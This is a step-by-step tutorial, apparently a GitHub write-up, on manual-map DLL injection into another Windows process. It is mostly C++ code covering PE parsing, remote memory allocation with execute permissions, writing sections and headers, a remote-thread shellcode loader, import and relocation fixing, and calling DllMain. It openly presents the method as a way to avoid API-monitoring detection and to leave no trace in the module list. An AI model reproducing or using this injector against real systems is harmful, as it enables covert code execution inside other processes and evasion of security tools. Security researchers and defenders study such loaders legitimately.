# Manual Mapping: DLL Injection in Detail

## 1. PE File Structure and Headers

PE (Portable Executable) files are the standard format for executable files in Windows. They have a specific structure that includes:

- **DOS Header**: Located at the beginning of the file and contains the "MZ" signature. It's important because it includes the `e_lfanew` field that points to the NT header.
- **DOS Stub**: Small code that runs if the file is opened in DOS.
- **NT Headers**: Contains the "PE\0\0" signature and has two main parts:
  - **File Header**: Contains information about the architecture and characteristics of the file.
  - **Optional Header**: Despite its name, it's mandatory and contains crucial data such as ImageBase (preferred base address), AddressOfEntryPoint (entry point), SizeOfImage (total size in memory), and addresses to important data tables.
- **Section Table**: Defines the sections of the file (.text, .data, .rdata, etc.).

![image](https://github.com/user-attachments/assets/69388fd9-69ea-434d-a948-33440d094f1f)

In ManualMap injection, we understand this structure to be able to manually load the DLL file into memory.

## 2. Reading the DLL File and Verification

```cpp
std::ifstream File(szDllFile, std::ios::binary | std::ios::ate);
// ... 
PIMAGE_DOS_HEADER pDosHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(pSrcData);
if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE)
// ...
PIMAGE_NT_HEADERS pNTHeader = reinterpret_cast<PIMAGE_NT_HEADERS>(pSrcData + pDosHeader->e_lfanew);
if (pNTHeader->Signature != IMAGE_NT_SIGNATURE)
```

In this section:
1. We open the DLL file in binary mode and read all its content into memory.
2. We verify that it has the correct DOS signature ("MZ" or 0x5A4D).
3. We use the `e_lfanew` field to find and verify the NT header with the "PE\0\0" signature.

![image](https://github.com/user-attachments/assets/4f8955bf-9fcb-4f2f-88d7-f402bec77f97)

This verification is crucial because it ensures that we are working with a valid PE file before attempting to load it into another process.

## 3. Memory Allocation in the Target Process

```cpp
LPVOID pTargetBase = VirtualAllocEx(hProcess, nullptr, pNTHeader->OptionalHeader.SizeOfImage, 
                                   MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
```

In this phase:
1. We use `VirtualAllocEx` to reserve and commit memory in the target process.
2. The size we request is exactly `SizeOfImage` from the optional header, which represents the total size that the DLL will occupy in memory.
3. We set `PAGE_EXECUTE_READWRITE` permissions to allow the code to execute.

Unlike `LoadLibrary`, which lets the operating system decide where to load the DLL, here we have complete control over the memory location. This allows us to avoid detections based on standard API monitoring.

![image](https://github.com/user-attachments/assets/ce90b027-4bd4-4fcf-9d1a-90e15a94d0db)

## 4. MANUAL_MAPPING_DATA Structure

```cpp
struct MANUAL_MAPPING_DATA
{
    LPVOID pLoadLibraryA;
    LPVOID pGetProcAddress;
    LPVOID pbase;
};

MANUAL_MAPPING_DATA data{ 0 };
data.pLoadLibraryA = LoadLibraryA;
data.pGetProcAddress = GetProcAddress;
data.pbase = pTargetBase;
```

This structure is fundamental to the technique:
1. It contains pointers to the `LoadLibraryA` and `GetProcAddress` functions, which are necessary to resolve imports.
2. It includes the base address where we have allocated memory in the target process.

This information will be passed to the shellcode so it can complete the loading process inside the target process.

## 5. Copying PE Sections

```cpp
PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pNTHeader);
for (UINT i = 0; i < pNTHeader->FileHeader.NumberOfSections; i++, pSectionHeader++)
{
    if (pSectionHeader->SizeOfRawData)
    {
        if (!WriteProcessMemory(hProcess, 
                               reinterpret_cast<BYTE*>(pTargetBase) + pSectionHeader->VirtualAddress,
                               pSrcData + pSectionHeader->PointerToRawData,
                               pSectionHeader->SizeOfRawData, nullptr))
        {
            cout << "Error: Could not write section " << i << endl;
            VirtualFreeEx(hProcess, pTargetBase, 0, MEM_RELEASE);
            delete[] pSrcData;
            return false;
        }
    }
}
```

In this stage:
1. We go through each section of the PE file (.text, .data, .rdata, etc.).
2. For each section, we calculate its location in the file (PointerToRawData) and its destination in memory (VirtualAddress).
3. We use `WriteProcessMemory` to copy the data of each section from our buffer to the memory of the target process.

The most important sections are:
- `.text`: Contains the executable code
- `.data`: Modifiable data (global variables)
- `.rdata`: Read-only data (constants, strings)
- `.idata`: Import table

![image](https://github.com/user-attachments/assets/06d7520d-f5f6-436a-a264-f7bca2d4217e)

## 6. Copying PE Headers

```cpp
if (!WriteProcessMemory(hProcess, pTargetBase, pSrcData, 
                       pNTHeader->OptionalHeader.SizeOfHeaders, nullptr))
{
    cout << "Error: Could not write PE headers" << endl;
    VirtualFreeEx(hProcess, pTargetBase, 0, MEM_RELEASE);
    delete[] pSrcData;
    return false;
}
```

Here:
1. We copy all PE headers (DOS, NT, section table) to the beginning of the allocated memory.
2. The size is specified in `SizeOfHeaders` of the optional header.
3. These headers are essential because they contain information that the operating system and the DLL code itself will need to function correctly.

## 7. Shellcode Creation and Execution

```cpp
BYTE* pShellcode = reinterpret_cast<BYTE*>(VirtualAllocEx(hProcess, nullptr, 
                                           4096, MEM_COMMIT | MEM_RESERVE, 
                                           PAGE_EXECUTE_READWRITE));
// ... WriteProcessMemory ...
HANDLE hThread = CreateRemoteThread(hProcess, nullptr, 0, 
                                   reinterpret_cast<LPTHREAD_START_ROUTINE>(pShellcode + sizeof(data)), 
                                   pShellcode, 0, nullptr);
```

This is a critical step:
1. We allocate 4KB of memory for the shellcode in the target process.
2. We first write the `MANUAL_MAPPING_DATA` structure and then the shellcode code.
3. We create a remote thread that will execute the shellcode.
4. The entry point is the address after the mapping data, and we pass the starting address (which includes the data) as a parameter.

The shellcode will execute in the context of the target process, allowing it to perform operations that we could not do directly from our process.

![image](https://github.com/user-attachments/assets/0e4bb1c6-6f4a-4a8c-8894-655d7d836e60)

## 8. Import Resolution Within the Shellcode

```cpp
auto _pImportDescriptor = reinterpret_cast<PIMAGE_IMPORT_DESCRIPTOR>(_DllBase + 
                         _pOptionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);

while (_pImportDescriptor->Name)
{
    char* szMod = reinterpret_cast<char*>(_DllBase + _pImportDescriptor->Name);
    HINSTANCE hDll = _LoadLibraryA(szMod);
    
    PIMAGE_THUNK_DATA pThunk = reinterpret_cast<PIMAGE_THUNK_DATA>(_DllBase + 
                             _pImportDescriptor->FirstThunk);

    if (_pImportDescriptor->OriginalFirstThunk)
    {
        PIMAGE_THUNK_DATA pOriginalThunk = reinterpret_cast<PIMAGE_THUNK_DATA>(_DllBase + 
                                        _pImportDescriptor->OriginalFirstThunk);

        while (pOriginalThunk->u1.AddressOfData)
        {
            if (pOriginalThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG)
            {
                // Import by ordinal
                UINT_PTR ordinal = pOriginalThunk->u1.Ordinal & 0xffff;
                pThunk->u1.Function = reinterpret_cast<UINT_PTR>(_GetProcAddress(hDll, 
                                    reinterpret_cast<char*>(ordinal)));
            }
            else
            {
                // Import by name
                PIMAGE_IMPORT_BY_NAME pImport = reinterpret_cast<PIMAGE_IMPORT_BY_NAME>(_DllBase + 
                                             pOriginalThunk->u1.AddressOfData);
                pThunk->u1.Function = reinterpret_cast<UINT_PTR>(_GetProcAddress(hDll, pImport->Name));
            }
            ++pOriginalThunk;
            ++pThunk;
        }
    }
    _pImportDescriptor++;
}
```

Inside the shellcode:
1. We access the DLL's import table (`IMAGE_DIRECTORY_ENTRY_IMPORT`).
2. For each imported module:
   - We get its name and load it with `LoadLibraryA`.
   - We go through all the imported functions from that module.
   - We resolve each function using `GetProcAddress` and fill in the IAT (Import Address Table) with the correct addresses.
3. This is done for imports by name and by ordinal.

This process is similar to what the Windows loader does, but we do it manually to have complete control.

## 9. Base Relocation Application

```cpp
if (_pOptionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size)
{
    auto _pRelocData = reinterpret_cast<PIMAGE_BASE_RELOCATION>(_DllBase + 
                     _pOptionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
    UINT_PTR delta = reinterpret_cast<UINT_PTR>(_DllBase) - _pOptionalHeader->ImageBase;
    
    while (_pRelocData->VirtualAddress)
    {
        UINT amountOfEntries = (_pRelocData->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
        WORD* pRelativeInfo = reinterpret_cast<WORD*>(_pRelocData + 1);

        for (UINT i = 0; i < amountOfEntries; i++)
        {
            if (pRelativeInfo[i] >> 12 == IMAGE_REL_BASED_HIGHLOW)
            {
                UINT_PTR* pPatch = reinterpret_cast<UINT_PTR*>(_DllBase + 
                                 _pRelocData->VirtualAddress + (pRelativeInfo[i] & 0xfff));
                *pPatch += delta;
            }
        }
        _pRelocData = reinterpret_cast<PIMAGE_BASE_RELOCATION>(reinterpret_cast<BYTE*>(_pRelocData) + 
                    _pRelocData->SizeOfBlock);
    }
}
```

Relocations are crucial when the DLL is loaded at an address different from its preferred ImageBase:
1. We calculate the "delta" (difference between the current address and the preferred one).
2. We go through the relocation table (`IMAGE_DIRECTORY_ENTRY_BASERELOC`).
3. We apply the delta to all absolute addresses within the code that need to be adjusted.

This is necessary because the compiled code may contain references to fixed addresses that assume the DLL will be loaded at its preferred ImageBase.

## 10. Calling DllMain

```cpp
if (_pOptionalHeader->AddressOfEntryPoint)
{
    auto _DllMain = reinterpret_cast<f_DLL_ENTRY_POINT>(_DllBase + _pOptionalHeader->AddressOfEntryPoint);
    _DllMain(_DllBase, DLL_PROCESS_ATTACH, nullptr);
}
```

Finally:
1. We locate the DLL's entry point (`AddressOfEntryPoint`).
2. We call the `DllMain` function with the `DLL_PROCESS_ATTACH` parameter.
3. This allows the DLL to execute its initialization code.

The call to `DllMain` is the "start signal" for the DLL. This is where the DLL code has its first opportunity to execute and perform any necessary setup.

## 11. Finding and Connecting to the Target Process

```cpp
DWORD GetProcessId(const char* processName)
{
    DWORD pid = 0;
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    
    if (snapshot != INVALID_HANDLE_VALUE)
    {
        PROCESSENTRY32 processEntry;
        processEntry.dwSize = sizeof(processEntry);
        
        if (Process32First(snapshot, &processEntry))
        {
            do
            {
                if (!strcmp(processEntry.szExeFile, processName))
                {
                    pid = processEntry.th32ProcessID;
                    break;
                }
            } while (Process32Next(snapshot, &processEntry));
        }
        CloseHandle(snapshot);
    }
    return pid;
}
```

This helper function:
1. Uses `CreateToolhelp32Snapshot` to get a "snapshot" of all running processes.
2. Goes through the list of processes with `Process32First`/`Process32Next`.
3. Compares the name of each process with the name being searched and returns the PID if it finds it.

Once the PID is found, we use `OpenProcess` to get a handle with the necessary permissions (`PROCESS_ALL_ACCESS`).

## 12. Resource Cleanup and Finalization

```cpp
WaitForSingleObject(hThread, INFINITE);
VirtualFreeEx(hProcess, pShellcode, 0, MEM_RELEASE);
delete[] pSrcData;
CloseHandle(hThread);
```

In this final phase:
1. We wait for the remote thread to finish with `WaitForSingleObject`.
2. We free the shellcode memory with `VirtualFreeEx` (it's no longer needed after injection).
3. We free the local buffer with `delete[]`.
4. We close the open handles with `CloseHandle`.

The DLL remains injected and functioning in the target process, without leaving visible traces in the list of loaded modules of the process.
